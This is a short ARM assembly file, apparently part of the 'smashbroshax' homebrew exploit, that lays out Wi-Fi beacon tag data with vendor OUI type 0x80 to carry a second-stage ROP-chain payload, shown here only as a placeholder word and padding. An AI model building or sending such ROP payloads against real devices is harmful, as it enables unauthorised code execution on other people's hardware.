.arm
.section .init
.global _start

#include "smashbroshax.h"

@ Beacon tag data for custom OUI-type 0x80. The inital ROP-chain in smashbros_beaconoui15.s loads this ROP-chain data.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI
.byte 0x80 @ OUI type

ropstart:
.word 0x58584148

.fill ((_start + 0xfd) - .), 1, 0xffffffff

